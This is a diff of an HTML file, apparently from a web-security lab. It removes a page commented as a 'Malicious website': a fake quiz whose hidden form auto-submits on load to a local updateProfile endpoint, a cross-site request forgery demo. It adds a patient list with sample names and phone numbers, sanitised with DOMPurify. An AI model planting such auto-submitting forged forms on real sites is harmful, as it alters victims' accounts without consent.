@@ -1,17 +1,88 @@
-<!-- Malicious website -->
-<html>
+<!DOCTYPE html>
+<html lang="en">
 
-<body>
-    <h1>Welcome to our fun quiz!</h1>
-    <form action="http://localhost:3003/updateProfile" method="POST">
-        <input type="hidden" name="name" value="Hacked Name" />
-        <input type="submit" value="Start Quiz!" />
-    </form>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Patients List</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.3.3/purify.min.js"></script>
+</head>
+
+<body style="font-family: Arial, sans-serif; padding: 20px; background-color: #f4f4f4;">
+
+    <h1 style="text-align: center; color: #333;">Patients List</h1>
+
+    <ul id="patients-list" style="list-style: none; padding: 0;">
+        <!-- Patients will be injected here -->
+    </ul>
+
     <script>
-        window.onload = function () {
-            document.forms[0].submit();
-        }
+        const patientsData = {
+            "patients": [
+                {
+                    "id": 1,
+                    "firstname": "Gregory",
+                    "surname": "Dennison",
+                    "phone": "(206) 342-8631"
+                },
+                {
+                    "id": 2,
+                    "firstname": "Sandra",
+                    "surname": "Newman",
+                    "phone": "(717) 550-1675"
+                },
+                {
+                    "id": 3,
+                    "firstname": "Amy",
+                    "surname": "Knight",
+                    "phone": "(248) 762-0356"
+                },
+                {
+                    "id": 4,
+                    "firstname": "Roy",
+                    "surname": "Baney",
+                    "phone": "(253) 644-2182"
+                },
+                {
+                    "id": 5,
+                    "firstname": "Arthur",
+                    "surname": "Moran",
+                    "phone": "(212) 658-3916"
+                },
+                {
+                    "id": 6,
+                    "firstname": "Clarita",
+                    "surname": "Bassler",
+                    "phone": "(209) 300-2557"
+                }
+            ]
+        };
+
+        const patientsListElement = document.getElementById('patients-list');
+
+        patientsData.patients.forEach(patient => {
+            const sanitizedFirstName = DOMPurify.sanitize(patient.firstname);
+            const sanitizedSurname = DOMPurify.sanitize(patient.surname);
+            const sanitizedPhone = DOMPurify.sanitize(patient.phone);
+
+            const listItem = document.createElement('li');
+            listItem.style.backgroundColor = '#fff';
+            listItem.style.marginBottom = '10px';
+            listItem.style.padding = '15px';
+            listItem.style.borderRadius = '5px';
+            listItem.style.boxShadow = '0 2px 5px rgba(0,0,0,0.1)';
+
+            listItem.innerHTML = `
+                <strong>ID:</strong> ${patient.id} <br>
+                <strong>First Name:</strong> ${sanitizedFirstName} <br>
+                <strong>Surname:</strong> ${sanitizedSurname} <br>
+                <strong>Phone:</strong> ${sanitizedPhone}
+            `;
+
+            patientsListElement.appendChild(listItem);
+        });
     </script>
+
 </body>
 
 </html>
